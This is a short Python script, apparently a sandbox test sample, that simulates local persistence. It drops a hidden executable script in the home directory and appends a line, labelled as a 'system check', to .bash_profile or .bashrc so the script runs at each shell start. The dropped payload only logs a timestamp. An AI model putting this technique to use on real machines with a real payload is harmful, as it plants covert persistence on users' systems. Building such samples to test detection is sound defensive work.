import os
import subprocess
import shutil

def create_local_persistence():
    """Simulates a basic persistence mechanism by dropping a file and modifying shell config."""
    # A dummy "malicious" payload to drop
    payload_name = ".sys_check.sh"
    payload_content = """#!/bin/bash
# Dummy persistence payload for sandbox testing
echo "Persistent payload executed at $(date)" >> /tmp/sys_check.log
"""
    
    try:
        # Determine paths
        user_home = os.path.expanduser('~')
        payload_path = os.path.join(user_home, payload_name)
        
        # Path to user's bash profile/config
        bash_config = os.path.join(user_home, '.bash_profile')
        if not os.path.exists(bash_config):
             # Fallback if profile doesn't exist
             bash_config = os.path.join(user_home, '.bashrc')
        
        # Check if the shell config exists and we can write to it
        if os.path.exists(bash_config) and os.access(bash_config, os.W_OK):
            print(f"Creating persistence mechanism in {bash_config}...")
            
            # Step 1: Write the payload to a hidden location
            with open(payload_path, "w") as f:
                f.write(payload_content)
            
            # Step 2: Make the payload executable
            # This requires running an external command, a strong signal
            # Use subprocess to run chmod
            print(f"Making payload executable: chmod +x {payload_path}")
            subprocess.run(['chmod', '+x', payload_path], check=True)
            
            # Step 3: Append the execution command to the user's bash config
            persistence_command = f"{payload_path} &\n" # Ampersand runs in the background
            with open(bash_config, "a") as f:
                f.write("\n# System check persistence entry\n")
                f.write(persistence_command)
            
            print("Persistence simulation complete.")
        else:
            print("Target user profile not found or not writable. Attempt failed.")
            
    except subprocess.CalledProcessError as e:
        print(f"Failed to modify permissions on payload: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    create_local_persistence()